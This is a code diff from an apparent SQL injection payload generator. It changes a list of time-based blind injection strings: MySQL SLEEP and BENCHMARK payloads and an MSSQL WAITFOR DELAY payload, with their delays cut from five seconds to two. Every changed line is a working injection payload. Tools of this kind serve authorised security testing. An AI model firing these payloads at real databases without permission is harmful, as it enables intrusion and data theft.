@@ -65,18 +65,18 @@ class SQLPayloadGenerator:
 
         # Time-based payloads (MySQL specific)
         self.time_based_payloads = [
-            "' AND SLEEP(5) -- ",
-            "\" AND SLEEP(5) -- ",
-            "' OR SLEEP(5) -- ",
-            "\" OR SLEEP(5) -- ",
-            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
-            "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
-            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
-            "\" OR (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
-            "'; WAITFOR DELAY '0:0:5' -- ",
-            "\"; WAITFOR DELAY '0:0:5' -- ",
-            "' OR BENCHMARK(10000000,MD5(1)) -- ",
-            "\" OR BENCHMARK(10000000,MD5(1)) -- "
+            "' AND SLEEP(2) -- ",
+            "\" AND SLEEP(2) -- ",
+            "' OR SLEEP(2) -- ",
+            "\" OR SLEEP(2) -- ",
+            "' AND (SELECT * FROM (SELECT(SLEEP(2)))a) -- ",
+            "\" AND (SELECT * FROM (SELECT(SLEEP(2)))a) -- ",
+            "' OR (SELECT * FROM (SELECT(SLEEP(2)))a) -- ",
+            "\" OR (SELECT * FROM (SELECT(SLEEP(2)))a) -- ",
+            "'; WAITFOR DELAY '0:0:2' -- ",
+            "\"; WAITFOR DELAY '0:0:2' -- ",
+            "' OR BENCHMARK(5000000,MD5(1)) -- ",
+            "\" OR BENCHMARK(5000000,MD5(1)) -- "
         ]
 
         # Union-based SQL injection payloads
